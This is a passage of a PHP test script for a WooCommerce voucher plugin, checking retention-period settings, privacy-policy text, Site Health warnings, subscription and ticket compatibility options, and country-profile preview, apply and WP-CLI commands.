$GLOBALS['vcap_test_options'][ VCAP\Compat\AffiliateCaptain::COMMISSION_OPTION ] = 'no';
$s33_aff->commission_base( 100, $s33_a_item, $s33_a_sale );
unset( $GLOBALS['vcap_test_filters']['vcap_affiliate_commission_on_voucher_sales'] );
add_filter( 'vcap_affiliate_commission_on_voucher_sales', static fn() => true );
$s33_a_filtered = $s33_aff->commission_base( 100, array( 'product_id' => 4711 ), $s33_a_sale );
unset( $GLOBALS['vcap_test_filters']['vcap_affiliate_commission_on_voucher_sales'] );
check( 'SET-VC-33: Affiliate Captain – commission on voucher sales by default; the setting "no" reaches filter vcap_affiliate_commission_on_voucher_sales, which wins', array( true, false ) === $s33_args && 100 === $s33_a_filtered, wp_json_encode( $s33_args ) );
// No. 39: Pass Captain – give the voucher back when its tickets are revoked.
$s33_p_def = VCAP\Compat\PassCaptain\Revocation::restore_setting();
$GLOBALS['vcap_test_options'][ VCAP\Compat\PassCaptain\Revocation::RESTORE_OPTION ] = 'no';
$s33_p_off = VCAP\Compat\PassCaptain\Revocation::restore_setting();
check( 'SET-VC-33: Pass Captain – the voucher is given back after revoked tickets by default; setting off keeps it redeemed; filter vcap_passcaptain_restore_on_revoke gets the setting and wins', true === $s33_p_def && false === $s33_p_off && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Compat/PassCaptain/Revocation.php' ), "apply_filters( 'vcap_passcaptain_restore_on_revoke', self::restore_setting(), \$voucher, \$info )" ) );
// No. 40: subscription switch and resubscribe orders.
if ( ! function_exists( 'wcs_order_contains_switch' ) ) {
	function wcs_order_contains_switch( $order ) { return true; }
}
if ( ! class_exists( 'WC_Order' ) ) {
	class WC_Order {}
}
$s33_subs  = new VCAP\Compat\Subscriptions();
$s33_order = new WC_Order();
unset( $GLOBALS['vcap_test_options'][ VCAP\Compat\Subscriptions::SWITCH_OPTION ] );
$s33_s_def = $s33_subs->should_issue( true, $s33_order );
$GLOBALS['vcap_test_options'][ VCAP\Compat\Subscriptions::SWITCH_OPTION ] = 'yes';
$s33_s_on = $s33_subs->should_issue( true, $s33_order );
add_filter( 'vcap_subscription_issue_on_switch', static fn() => false );
$s33_s_filtered = $s33_subs->should_issue( true, $s33_order );
unset( $GLOBALS['vcap_test_filters']['vcap_subscription_issue_on_switch'] );
check( 'SET-VC-33: WooCommerce Subscriptions – a switch order issues no voucher by default; the setting allows it; filter vcap_subscription_issue_on_switch wins', false === $s33_s_def && true === $s33_s_on && false === $s33_s_filtered );
$GLOBALS['vcap_test_options'] = $s33_saved;

// SET-VC-08: retention periods as settings (block "Retention", Privacy & advanced); defaults = the values of 1.2.0,
// the filters get the setting and win; Site Health warns while no recipient data period is set (owner decision S9).
echo "SET-VC-08 retention periods\n";
VCAP\SettingsRegistry::reset();
$r8_saved = $GLOBALS['vcap_test_options'];
$r8_keys  = array( 'vcap_retention_days', 'vcap_voucher_requests_open_months', 'vcap_voucher_requests_closed_months', 'vcap_review_retention_months', 'vcap_review_revoked_retention_days', 'vcap_command_log_days', 'vcap_scanner_failed_lookup_days' );
foreach ( $r8_keys as $r8_k ) {
	unset( $GLOBALS['vcap_test_options'][ $r8_k ] );
}
$r8_def    = VCAP\Settings::defaults();
$r8_fields = array();
foreach ( VCAP\Settings::retention_fields() as $r8_f ) {
	if ( isset( $r8_f['id'] ) && 'number' === ( $r8_f['type'] ?? '' ) ) {
		$r8_fields[ (string) $r8_f['id'] ] = $r8_f;
	}
}
$r8_privacy = array_column( ( new VCAP\Settings() )->fields( 'privacy' ), 'id' );
check(
	'SET-VC-08: defaults are today\'s values (recipient data 0 = never, requests 6/24 months, review notes 24 months / withdrawn 90 days, command protocol 90 days, failed lookups 92 days)',
	0 === $r8_def['vcap_retention_days'] && 6 === $r8_def['vcap_voucher_requests_open_months'] && 24 === $r8_def['vcap_voucher_requests_closed_months'] && 24 === $r8_def['vcap_review_retention_months']
		&& 90 === $r8_def['vcap_review_revoked_retention_days'] && 90 === $r8_def['vcap_command_log_days'] && 92 === $r8_def['vcap_scanner_failed_lookup_days']
		&& array( 'open' => 6, 'closed' => 24 ) === VCAP\Integrations\VoucherRequests::retention_months() && array( 'revoked_days' => 90, 'months' => 24 ) === VCAP\Integrations\ReviewSource::retention()
		&& 90 === VCAP\API\V1\OptionCommandStore::log_days() && 92 === VCAP\Counter::failed_lookup_days()
);
check(
	'SET-VC-08: one field per period in the block "Retention" of Privacy & advanced; every one registered with a minimum, legal weight and the visible note "Not legally checked"',
	$r8_keys === array_keys( $r8_fields ) && array() === array_diff( $r8_keys, $r8_privacy )
		&& array() === array_filter( $r8_keys, static fn( $k ) => 'privacy' !== VCAP\SettingsRegistry::get( $k )['section'] || true !== VCAP\SettingsRegistry::get( $k )['legal'] || null === VCAP\SettingsRegistry::get( $k )['min'] )
		&& array() === array_filter( $r8_fields, static fn( $f ) => ! str_contains( (string) ( $f['desc'] ?? '' ), 'Not legally checked' ) || array_key_exists( 'desc_tip', $f ) || ! isset( $f['custom_attributes']['min'] ) )
		&& 30 === VCAP\SettingsRegistry::get( 'vcap_review_revoked_retention_days' )['min'] && 1 === VCAP\SettingsRegistry::get( 'vcap_voucher_requests_open_months' )['min'] && 0 === VCAP\SettingsRegistry::get( 'vcap_retention_days' )['min'],
	implode( ', ', array_keys( $r8_fields ) )
);
// Voucher requests.
$GLOBALS['vcap_test_options']['vcap_voucher_requests_open_months']   = '3';
$GLOBALS['vcap_test_options']['vcap_voucher_requests_closed_months'] = '0'; // Below the minimum (written past the page).
$r8_req  = VCAP\Integrations\VoucherRequests::retention_months();
$r8_seen = null;
add_filter(
	'vcap_voucher_requests_retention_months',
	static function ( $m ) use ( &$r8_seen ) {
		$r8_seen = $m;
		return array( 'open' => 2, 'closed' => 0 );
	}
);
$r8_req_f = VCAP\Integrations\VoucherRequests::retention_months();
array_pop( $GLOBALS['vcap_test_filters']['vcap_voucher_requests_retention_months'] );
check( 'SET-VC-08: voucher requests – the settings open/completed act (never below 1 month), the filter gets them and wins (0 = keep)', array( 'open' => 3, 'closed' => 1 ) === $r8_req && array( 'open' => 3, 'closed' => 1 ) === $r8_seen && array( 'open' => 2, 'closed' => 0 ) === $r8_req_f );
// Review invitations.
$GLOBALS['vcap_test_options']['vcap_review_retention_months']       = '12';
$GLOBALS['vcap_test_options']['vcap_review_revoked_retention_days'] = '5';
$r8_rev = VCAP\Integrations\ReviewSource::retention();
add_filter( 'vcap_review_retention_months', static fn( $m ) => $m + 1 );
add_filter( 'vcap_review_revoked_retention_days', static fn() => 0 );
$r8_rev_f = VCAP\Integrations\ReviewSource::retention();
array_pop( $GLOBALS['vcap_test_filters']['vcap_review_retention_months'] );
array_pop( $GLOBALS['vcap_test_filters']['vcap_review_revoked_retention_days'] );
check( 'SET-VC-08: review invitation notes – months and withdrawn days follow the settings (withdrawn never below 30 days), the filters get them and win', array( 'revoked_days' => 30, 'months' => 12 ) === $r8_rev && array( 'revoked_days' => 0, 'months' => 13 ) === $r8_rev_f );
// Command protocol: setting 30 days removes counters and protocol of older days in the daily maintenance.
$GLOBALS['vcap_test_options']['vcap_command_log_days'] = '30';
$r8_log = VCAP\API\V1\OptionCommandStore::log_days();
add_filter( 'vcap_command_log_days', static fn( $d ) => $d * 2 );
$r8_log_f = VCAP\API\V1\OptionCommandStore::log_days();
array_pop( $GLOBALS['vcap_test_filters']['vcap_command_log_days'] );
$r8_saved_wpdb            = $GLOBALS['wpdb'] ?? null;
$GLOBALS['wpdb']          = new VCAP_Test_Wpdb();
$GLOBALS['wpdb']->answers = array( '/GET_LOCK/' => '1', '/RELEASE_LOCK/' => '1' );
$GLOBALS['vcap_test_options']['vcap_cmd_days']             = array( '2026-10-01' => array(), '2026-11-10' => array() );
$GLOBALS['vcap_test_options']['vcap_cmd_log_2026-10-01']   = array( 'entries' => array( array( 'code' => 'x' ) ) );
$GLOBALS['vcap_test_options']['vcap_cmd_count_2026-10-01'] = array( 'voucher.void' => 1 );
$GLOBALS['vcap_test_options']['vcap_cmd_log_2026-11-10']   = array( 'entries' => array( array( 'code' => 'y' ) ) );
( new VCAP\API\V1\OptionCommandStore() )->prune( '2026-11-23' );
$r8_log_pruned = array( isset( $GLOBALS['vcap_test_options']['vcap_cmd_log_2026-10-01'] ), isset( $GLOBALS['vcap_test_options']['vcap_cmd_count_2026-10-01'] ), isset( $GLOBALS['vcap_test_options']['vcap_cmd_log_2026-11-10'] ) );
$GLOBALS['vcap_test_options']['vcap_command_log_days']       = '90';
$GLOBALS['vcap_test_options']['vcap_cmd_log_2026-10-01']     = array( 'entries' => array() );
$GLOBALS['vcap_test_options']['vcap_cmd_days']['2026-10-01'] = array();
( new VCAP\API\V1\OptionCommandStore() )->prune( '2026-11-23' );
$r8_log_kept     = isset( $GLOBALS['vcap_test_options']['vcap_cmd_log_2026-10-01'] );
$GLOBALS['wpdb'] = $r8_saved_wpdb;
check( 'SET-VC-08: command protocol – the setting acts in the daily cleanup (30 days: a day 53 days ago goes, one 13 days ago stays; 90 days: kept), the filter gets it and wins', 30 === $r8_log && 60 === $r8_log_f && array( false, false, true ) === $r8_log_pruned && $r8_log_kept );
// Failed counter lookups.
$r8_today = wp_date( 'Y-m-d' );
$r8_old   = wp_date( 'Y-m-d', time() - 40 * DAY_IN_SECONDS );
$GLOBALS['vcap_test_options']['vcap_scanner_failed_lookup_days'] = '31';
$GLOBALS['vcap_test_options'][ VCAP\Counter::FAILED_LOOKUPS ]    = array(
	$r8_old   => array( 7 => 2 ),
	$r8_today => array( 7 => 1 ),
);
VCAP\Counter::prune_failed_lookups();
$r8_lookups = array_keys( $GLOBALS['vcap_test_options'][ VCAP\Counter::FAILED_LOOKUPS ] );
$GLOBALS['vcap_test_options']['vcap_scanner_failed_lookup_days'] = '5'; // Below the minimum: 31.
$r8_min = VCAP\Counter::failed_lookup_days();
$GLOBALS['vcap_test_options'][ VCAP\Counter::FAILED_LOOKUPS ] = array( $r8_old => array( 7 => 2 ) );
add_filter( 'vcap_scanner_failed_lookup_days', static fn() => 0 );
VCAP\Counter::record_failed_lookup( 7 );
$r8_lookups_f = array_keys( $GLOBALS['vcap_test_options'][ VCAP\Counter::FAILED_LOOKUPS ] );
array_pop( $GLOBALS['vcap_test_filters']['vcap_scanner_failed_lookup_days'] );
check( 'SET-VC-08: failed counter lookups – the setting acts in the daily cleanup (31 days: a day 40 days ago goes), never below 31; the filter wins (0 keeps every day)', array( $r8_today ) === $r8_lookups && 31 === $r8_min && in_array( $r8_old, $r8_lookups_f, true ) && in_array( $r8_today, $r8_lookups_f, true ) );
// Recipient data: the maintenance step uses the setting; the daily maintenance calls the new step.
$r8_delivery = (string) file_get_contents( VCAP_PATH . 'src/Delivery.php' );
check( 'SET-VC-08: the daily maintenance uses every period (retention, voucher_requests, review_refs and the new step "protocols")', in_array( 'protocols', VCAP\Delivery::MAINTENANCE_STEPS, true ) && str_contains( $r8_delivery, "\$this->settings->get( 'vcap_retention_days' )" ) && str_contains( $r8_delivery, 'Counter::prune_failed_lookups();' ) && str_contains( $r8_delivery, '( new API\V1\OptionCommandStore() )->prune();' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Integrations/ReviewSource.php' ), '$keep   = self::retention();' ) );
// Privacy policy text names the values.
$GLOBALS['vcap_test_options']['vcap_retention_days']                 = '730';
$GLOBALS['vcap_test_options']['vcap_voucher_requests_open_months']   = '4';
$GLOBALS['vcap_test_options']['vcap_voucher_requests_closed_months'] = '36';
$GLOBALS['vcap_test_options']['vcap_review_retention_months']        = '18';
$GLOBALS['vcap_test_options']['vcap_review_revoked_retention_days']  = '60';
$GLOBALS['vcap_test_options']['vcap_command_log_days']               = '120';
$GLOBALS['vcap_test_options']['vcap_scanner_failed_lookup_days']     = '45';
$r8_policy = implode( "\n", VCAP\Privacy::policy_paragraphs() );
unset( $GLOBALS['vcap_test_options']['vcap_retention_days'] );
$r8_policy0 = implode( "\n", VCAP\Privacy::policy_paragraphs() );
check(
	'SET-VC-08: the suggested privacy policy text names the periods set (recipient data, requests, review notes, command protocol, failed lookups); no recipient data period while it is 0',
	str_contains( $r8_policy, 'removed 730 days after the voucher has expired' ) && str_contains( $r8_policy, 'never completed are deleted after 4 months' ) && str_contains( $r8_policy, 'company order are deleted after 36 months' )
		&& str_contains( $r8_policy, 'deleted 60 days after a cancellation' ) && str_contains( $r8_policy, 'at the latest 18 months after' ) && str_contains( $r8_policy, 'This protocol is kept for 120 days.' ) && str_contains( $r8_policy, 'These counts are kept for 45 days.' )
		&& ! str_contains( $r8_policy0, 'days after the voucher has expired' ),
	$r8_policy
);
// Site Health: recommended while no recipient data period is set (S9), good once one is set.
$r8_health_0 = ( new VCAP\Health() )->test_retention();
$GLOBALS['vcap_test_options']['vcap_retention_days'] = '1095';
$r8_health_1 = ( new VCAP\Health() )->test_retention();
$r8_tests    = ( new VCAP\Health() )->tests( array() );
check( 'SET-VC-08: Site Health recommends a recipient data period while it is 0 (link to the block "Retention") and is good with a period', 'recommended' === $r8_health_0['status'] && str_contains( $r8_health_0['actions'], 'section=privacy' ) && 'good' === $r8_health_1['status'] && str_contains( $r8_health_1['description'], '1095 days' ) && isset( $r8_tests['direct']['vcap_retention'] ) );
$GLOBALS['vcap_test_options'] = $r8_saved;
// SET-VC-02: country profiles – a suggestion with preview "current → suggested", applied only after confirmation.
echo "SET-VC-02 country profiles\n";
$cp_saved      = $GLOBALS['vcap_test_options'];
$cp_saved_tr   = $GLOBALS['vcap_test_transients'] ?? array();
$cp_saved_wpdb = $GLOBALS['wpdb'] ?? null;
// A shop from before the statutory validity (365 days stored, L13): the validity rule that applies is "days".
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'DE:BE', 'vcap_default_expiry_days' => '365' );
VCAP\CountryProfiles::reset();
$cp_all = VCAP\CountryProfiles::all();
check(
	'SET-VC-02: profiles DE, AT and CH (market country, legal check pending) plus EU and OTHER (neutral, not checked); none is marked as checked; the shop\'s base country picks its profile (member states EU, others OTHER)',
	array( 'DE', 'AT', 'CH', 'EU', 'OTHER' ) === array_keys( $cp_all ) && array( 'DE', 'AT', 'CH', '', '' ) === array_column( $cp_all, 'country' ) && array() === array_filter( array_column( $cp_all, 'checked' ) )
		&& 'DE' === VCAP\CountryProfiles::for_base_country() && 'Germany' === VCAP\CountryProfiles::label( 'de' ) && str_starts_with( VCAP\CountryProfiles::status( 'CH' ), 'Legal check pending' ) && str_starts_with( VCAP\CountryProfiles::status( 'EU' ), 'Not checked' )
		&& ( static function () {
			$out = array();
			foreach ( array( 'FR' => 'EU', 'US:CA' => 'OTHER', 'AT' => 'AT', 'CH' => 'CH' ) as $base => $expected ) {
				$GLOBALS['vcap_test_options']['woocommerce_default_country'] = $base;
				$out[] = VCAP\CountryProfiles::for_base_country() === $expected;
			}
			$GLOBALS['vcap_test_options']['woocommerce_default_country'] = 'DE:BE';
			return ! in_array( false, $out, true );
		} )(),
	json_encode( array_keys( $cp_all ) )
);
$cp_before = $GLOBALS['vcap_test_options'];
$cp_de     = VCAP\CountryProfiles::preview( 'DE' );
$cp_legal  = array_filter( $cp_de, static fn( $i ) => $i['legal'] );
check(
	'SET-VC-02: the preview of DE on a new shop shows current → suggested: statutory validity rule, the DE row of "Statutory validity per country" from the market data (3 years to the end of the year), retention 1,095 days, date format d.m.Y; receipt number and link parameter are already right; showing it changes nothing',
	array( 'vcap_default_expiry_rule', 'expiry_row', 'vcap_counter_require_receipt', 'vcap_retention_days', 'vcap_date_format', 'vcap_coupon_link_param' ) === array_keys( $cp_de )
		&& 'statutory' === $cp_de['vcap_default_expiry_rule']['value'] && $cp_de['vcap_default_expiry_rule']['changed'] && ! $cp_de['vcap_default_expiry_rule']['preselected'] && $cp_de['vcap_default_expiry_rule']['own']
		&& array( 'country' => 'DE', 'years' => 3, 'end_of_year' => true ) === array_slice( $cp_de['expiry_row']['value'][0], 0, 3 ) && str_contains( $cp_de['expiry_row']['value'][0]['note'], '§§ 195, 199 BGB' ) && str_ends_with( $cp_de['expiry_row']['value'][0]['note'], '– Legal check pending' ) && $cp_de['expiry_row']['preselected'] && VCAP\Markets::EXPIRY_OPTION === $cp_de['expiry_row']['key']
		&& '1095' === $cp_de['vcap_retention_days']['value'] && '0 (keep)' === $cp_de['vcap_retention_days']['from'] && $cp_de['vcap_retention_days']['preselected']
		&& 'd.m.Y' === $cp_de['vcap_date_format']['value'] && 'WordPress date format' === $cp_de['vcap_date_format']['from'] && ! $cp_de['vcap_date_format']['legal']
		&& ! $cp_de['vcap_counter_require_receipt']['changed'] && ! $cp_de['vcap_coupon_link_param']['changed'] && $cp_de['vcap_coupon_link_param']['opt_in']
		&& $cp_before === $GLOBALS['vcap_test_options'],
	json_encode( $cp_de )
);
check(
	'SET-VC-02: every value with legal weight carries the mark "Legal check pending" (Rechtsprüfung) – validity rule, validity row, receipt number, retention and the tax hint; values without legal weight do not',
	array( 'vcap_default_expiry_rule', 'expiry_row', 'vcap_counter_require_receipt', 'vcap_retention_days' ) === array_keys( $cp_legal ) && array( 'Legal check pending' ) === array_values( array_unique( array_column( $cp_legal, 'review' ) ) )
		&& '' === $cp_de['vcap_date_format']['review'] && '' === $cp_de['vcap_coupon_link_param']['review']
		&& 'Legal check pending' === VCAP\CountryProfiles::hints( 'DE' )['tax']['review'] && str_contains( VCAP\CountryProfiles::hints( 'DE' )['tax']['text'], 'TAX.md' ) && str_contains( VCAP\CountryProfiles::hints( 'DE' )['accounting']['text'], 'DATEV' )
		&& ( static function () {
			foreach ( array( 'AT', 'CH' ) as $id ) {
				foreach ( VCAP\CountryProfiles::preview( $id ) as $item ) {
					if ( $item['legal'] && 'Legal check pending' !== $item['review'] ) {
						return false;
					}
				}
				if ( 'Legal check pending' !== VCAP\CountryProfiles::hints( $id )['tax']['review'] ) {
					return false;
				}
			}
			return true;
		} )()
);
$cp_eu = VCAP\CountryProfiles::preview( 'EU' );
$GLOBALS['vcap_test_options']['woocommerce_default_country'] = 'CH';
$cp_de_from_ch = VCAP\CountryProfiles::preview( 'DE' );
$cp_ch         = VCAP\CountryProfiles::preview( 'CH' );
$GLOBALS['vcap_test_options']['woocommerce_default_country'] = 'DE:BE';
check(
	'SET-VC-02: receipt number from the market flag "fiscal_receipt": a shop based in CH choosing DE gets "yes", the CH profile suggests none (not legally checked); CH suggests 10 years (Art. 127 OR) marked for the legal check; the neutral profiles EU/OTHER suggest nothing with legal weight and the link parameter only as an unticked suggestion',
	'yes' === $cp_de_from_ch['vcap_counter_require_receipt']['value'] && $cp_de_from_ch['vcap_counter_require_receipt']['preselected'] && ! isset( $cp_ch['vcap_counter_require_receipt'] )
		&& 10 === $cp_ch['expiry_row']['value'][0]['years'] && 'Art. 127 OR (10 Jahre) – Legal check pending' === $cp_ch['expiry_row']['value'][0]['note']
		&& array( 'vcap_coupon_link_param' ) === array_keys( $cp_eu ) && 'voucher' === $cp_eu['vcap_coupon_link_param']['value'] && $cp_eu['vcap_coupon_link_param']['changed'] && ! $cp_eu['vcap_coupon_link_param']['preselected'] && array() === array_filter( array_column( $cp_eu, 'legal' ) ),
	json_encode( array( $cp_de_from_ch, $cp_ch ) )
);
// Nothing is overwritten silently: own values are shown but not ticked; the shop's other validity rows stay.
$GLOBALS['vcap_test_options']['vcap_date_format'] = 'Y-m-d';
$GLOBALS['vcap_test_options'][ VCAP\Markets::EXPIRY_OPTION ] = array(
	array( 'country' => 'FR', 'years' => 5, 'end_of_year' => true, 'note' => 'Code civil' ),
	array( 'country' => 'DE', 'years' => 4, 'end_of_year' => false, 'note' => 'eigene Regel' ),
);
$cp_own = VCAP\CountryProfiles::preview( 'DE' );
check(
	'SET-VC-02: a value the shop set itself (date format, its own DE validity row) is shown "current → suggested" but not ticked; the row change replaces only the DE row and keeps the FR row',
	$cp_own['vcap_date_format']['changed'] && $cp_own['vcap_date_format']['own'] && ! $cp_own['vcap_date_format']['preselected'] && str_starts_with( $cp_own['vcap_date_format']['from'], 'Y-m-d (' )
		&& $cp_own['expiry_row']['changed'] && $cp_own['expiry_row']['own'] && ! $cp_own['expiry_row']['preselected'] && '4 years (eigene Regel)' === $cp_own['expiry_row']['from']
		&& array( 'FR', 'DE' ) === array_column( $cp_own['expiry_row']['value'], 'country' ) && 'Code civil' === $cp_own['expiry_row']['value'][0]['note'] && 3 === $cp_own['expiry_row']['value'][1]['years'],
	json_encode( $cp_own )
);
// Apply: only the chosen rows, through the register check, with a backup and the change log source "country profile".
$cp_pick   = array_keys( array_filter( $cp_own, static fn( $i ) => $i['preselected'] ) );
$cp_result = VCAP\CountryProfiles::apply( 'DE', $cp_pick );
$cp_o      = $GLOBALS['vcap_test_options'];
$cp_after  = VCAP\CountryProfiles::preview( 'DE' );
$cp_src    = (string) file_get_contents( VCAP_PATH . 'src/CountryProfiles.php' );
check(
	'SET-VC-02: applying stores only the ticked values (retention), leaves the unticked own values (validity rule "days" of a shop with own days – PV-P3-2 –, date format, DE row) unchanged, saves a backup first ("profile") and remembers the profile; the values stay freely editable (ordinary options)',
	array( 'vcap_retention_days' ) === $cp_pick && array( 'vcap_retention_days' ) === $cp_result['changed'] && ! isset( $cp_o['vcap_default_expiry_rule'] ) && 'days' === VCAP\ProductConfig::default_expiry_rule() && '1095' === $cp_o['vcap_retention_days']
		&& 'Y-m-d' === $cp_o['vcap_date_format'] && 4 === $cp_o[ VCAP\Markets::EXPIRY_OPTION ][1]['years'] && 'profile' === VCAP\SettingsTransfer::backups()[ $cp_result['backup'] ]['reason']
		&& 'DE' === VCAP\CountryProfiles::applied()['id'] && ! $cp_after['vcap_retention_days']['changed'] && $cp_after['vcap_date_format']['changed']
		&& '7' === VCAP\SettingsTransfer::validate( 'vcap_retention_days', '7' ),
	json_encode( array( $cp_result, $cp_pick ) )
);
$cp_row = VCAP\CountryProfiles::apply( 'DE', array( 'expiry_row', 'vcap_date_format' ) );
check(
	'SET-VC-02: ticking an own value replaces it – the DE row is replaced in place (FR row kept), the date format set; the change log records the source "country profile" (SettingsTransfer::apply with SettingsLog::VIA_PROFILE)',
	array( 'vcap_expiry_by_country', 'vcap_date_format' ) === $cp_row['changed'] && array( 'FR', 'DE' ) === array_column( $GLOBALS['vcap_test_options'][ VCAP\Markets::EXPIRY_OPTION ], 'country' ) && 3 === $GLOBALS['vcap_test_options'][ VCAP\Markets::EXPIRY_OPTION ][1]['years'] && 'd.m.Y' === $GLOBALS['vcap_test_options']['vcap_date_format']
		&& str_contains( $cp_src, 'SettingsTransfer::apply( $values, SettingsLog::VIA_PROFILE )' ) && str_contains( $cp_src, 'SettingsTransfer::validate( $key, $value )' ) && 'Admin (country profile)' === VCAP\SettingsLog::source_label( array( 'source' => 'admin', 'via' => VCAP\SettingsLog::VIA_PROFILE ) ),
	json_encode( $cp_row )
);
// An invalid suggestion (from the filter) refuses everything; secrets and the data removal switch cannot be suggested.
$GLOBALS['vcap_test_filters']['vcap_country_profiles'] = array(
	array(
		static function ( $profiles ) {
			$profiles['DE']['settings']['vcap_retention_days']      = -5;
			$profiles['DE']['settings']['vcap_secret']              = 'stolen';
			$profiles['DE']['settings']['vcap_delete_on_uninstall'] = 'yes';
			$profiles['XK'] = array( 'country' => 'XK', 'label' => 'Kosovo', 'settings' => array( 'vcap_date_format' => 'j.n.Y' ) );
			return $profiles;
		},
		1,
	),
);
VCAP\CountryProfiles::reset();
$cp_bad_before = $GLOBALS['vcap_test_options'];
$cp_bad        = VCAP\CountryProfiles::apply( 'DE', array( 'vcap_retention_days', 'vcap_default_expiry_rule' ) );
$cp_filtered   = VCAP\CountryProfiles::get( 'DE' );
check(
	'SET-VC-02: filter vcap_country_profiles adds profiles and changes values; an invalid value is shown with its error and refuses the whole apply (nothing changed); secrets and the data removal switch are never suggested',
	is_wp_error( $cp_bad ) && str_contains( $cp_bad->get_error_message(), 'Nothing was changed.' ) && $cp_bad_before === $GLOBALS['vcap_test_options'] && '' !== VCAP\CountryProfiles::preview( 'DE' )['vcap_retention_days']['error']
		&& ! isset( $cp_filtered['settings']['vcap_secret'] ) && ! isset( $cp_filtered['settings']['vcap_delete_on_uninstall'] ) && 'Kosovo' === VCAP\CountryProfiles::label( 'XK' ) && 'XK' === VCAP\CountryProfiles::get( 'XK' )['country']
		&& is_wp_error( VCAP\CountryProfiles::preview( 'NOPE' ) ) && is_wp_error( VCAP\CountryProfiles::apply( 'NOPE', array() ) ),
	is_wp_error( $cp_bad ) ? $cp_bad->get_error_message() : json_encode( $cp_bad )
);
unset( $GLOBALS['vcap_test_filters']['vcap_country_profiles'] );
VCAP\CountryProfiles::reset();
// Admin: preview table, apply/cancel buttons (admin-post, own nonce), the block on "General"; cancel changes nothing.
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'AT' );
$cp_html      = VCAP\Admin\CountryProfilesAdmin::preview_html( 'AT' );
$cp_admin_src = (string) file_get_contents( VCAP_PATH . 'src/Admin/CountryProfilesAdmin.php' );
preg_match_all( '/public static function (preview|apply|cancel)\(\): void \{\s*(\S+)/', $cp_admin_src, $cp_m );
$cp_general = ( new VCAP\Settings() )->fields( '' );
$cp_open    = VCAP\Admin\CountryProfilesAdmin::open_preview( 'ch' ) && 'CH' === VCAP\Admin\CountryProfilesAdmin::pending() && ! VCAP\Admin\CountryProfilesAdmin::open_preview( 'XX' );
check(
	'SET-VC-02: the preview is a table "current → suggested" with a checkbox per change (ticked = suggested to take), the mark "Legal check pending", the hints, and the buttons "Apply ticked values" and "Cancel" that post to admin-post (never "Save changes"); showing it changes nothing',
	str_contains( $cp_html, '<table class="widefat striped">' ) && str_contains( $cp_html, 'name="vcap_profile_items[]" value="vcap_retention_days" checked="checked"' ) && str_contains( $cp_html, 'value="expiry_row" checked="checked"' ) && str_contains( $cp_html, '30 years' )
		&& str_contains( $cp_html, '<strong>Legal check pending</strong>' ) && str_contains( $cp_html, 'formaction="https://shop.test/wp-admin/admin-post.php?action=vcap_country_profile_apply"' ) && str_contains( $cp_html, 'action=vcap_country_profile_cancel' ) && str_contains( $cp_html, 'name="vcap_profile_id" value="AT"' ) && str_contains( $cp_html, 'Default tax type:' )
		&& array( 'woocommerce_default_country' => 'AT' ) === $GLOBALS['vcap_test_options'] && $cp_open,
	substr( $cp_html, 0, 600 )
);
check(
	'SET-VC-02: every admin action needs manage_woocommerce and the nonce (guard() first); apply refuses an expired or different preview; cancel only closes the preview; the block with the button is the first one on "General"',
	3 === count( $cp_m[1] ) && array( 'self::guard();' ) === array_values( array_unique( $cp_m[2] ) ) && 'manage_woocommerce' === VCAP\Admin\CountryProfilesAdmin::CAP && str_contains( $cp_admin_src, 'check_admin_referer( self::NONCE, self::NONCE_FIELD );' )
		&& str_contains( $cp_admin_src, "'' === \$pending || \$pending !== \$posted" ) && preg_match( '/function cancel\(\): void \{\s*self::guard\(\);\s*delete_transient\( self::PENDING \. get_current_user_id\(\) \);\s*self::done\(/', $cp_admin_src )
		&& 'vcap_country_profile' === $cp_general[0]['id'] && VCAP\Admin\CountryProfilesAdmin::FIELD_TYPE === $cp_general[1]['type'] && false === $cp_general[1]['is_option']
		&& in_array( VCAP\CountryProfiles::APPLIED_OPTION, VCAP\SettingsRegistry::internal()['names'], true ) && ! VCAP\SettingsRegistry::has( VCAP\CountryProfiles::APPLIED_OPTION ),
	json_encode( array_slice( $cp_general, 0, 2 ) )
);
// WP-CLI: wp vcap settings profile list|show|apply.
$GLOBALS['vcap_test_options'] = array( 'woocommerce_default_country' => 'DE', 'vcap_coupon_link_param' => 'gutschein' );
$st_cli( array( 'profile', 'list' ), array( 'format' => 'json' ) );
$cp_cli_rows = $GLOBALS['vcap_cli_rows'] ?? array();
$cp_c_show   = $st_cli( array( 'profile', 'show' ), array( 'country' => 'EU' ) );
$cp_c_dry    = $st_cli( array( 'profile', 'apply' ), array( 'country' => 'DE', 'dry-run' => true ) );
$cp_c_o_dry  = $GLOBALS['vcap_test_options'];
$cp_c_apply  = $st_cli( array( 'profile', 'apply' ), array( 'country' => 'de', 'yes' => true ) );
$cp_c_o      = $GLOBALS['vcap_test_options'];
$cp_c_all    = $st_cli( array( 'profile', 'apply' ), array( 'country' => 'EU', 'yes' => true, 'all' => true ) );
$cp_c_bad    = $st_cli( array( 'profile', 'apply' ), array( 'country' => 'XX' ) );
check(
	'SET-VC-02: wp vcap settings profile list shows the profiles with their check state; show and --dry-run change nothing (an unsaved validity rule that already is "statutory" is no change); apply takes the suggested values (own values and the link parameter only with --all) with the source "country profile"; an unknown profile is refused',
	array( 'DE', 'AT', 'CH', 'EU', 'OTHER' ) === array_column( $cp_cli_rows, 'profile' ) && 'no (legal check pending)' === $cp_cli_rows[0]['checked'] && 'no (neutral, not checked)' === $cp_cli_rows[3]['checked']
		&& in_array( 'line:   - Link parameter: gutschein -> voucher (suggestion only, kept – use --all)', $cp_c_show, true )
		&& in_array( 'line: Dry run: 3 settings would change.', $cp_c_dry, true ) && in_array( 'line:   * Anonymise recipient data after (days): 0 (keep) -> 1095 [Legal check pending]', $cp_c_dry, true ) && ! isset( $cp_c_o_dry['vcap_retention_days'] )
		&& str_starts_with( (string) end( $cp_c_apply ), 'success: 3 settings changed from the country profile DE.' ) && '1095' === $cp_c_o['vcap_retention_days'] && 'gutschein' === $cp_c_o['vcap_coupon_link_param']
		&& str_starts_with( (string) end( $cp_c_all ), 'success: 1 settings changed' ) && 'voucher' === $GLOBALS['vcap_test_options']['vcap_coupon_link_param'] && 'EU' === VCAP\CountryProfiles::applied()['id']
		&& str_contains( implode( ' ', $cp_c_bad ), 'There is no country profile "XX"' ) && in_array( 'halted', $cp_c_bad, true )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'API.md' ), 'wp vcap settings profile' ),
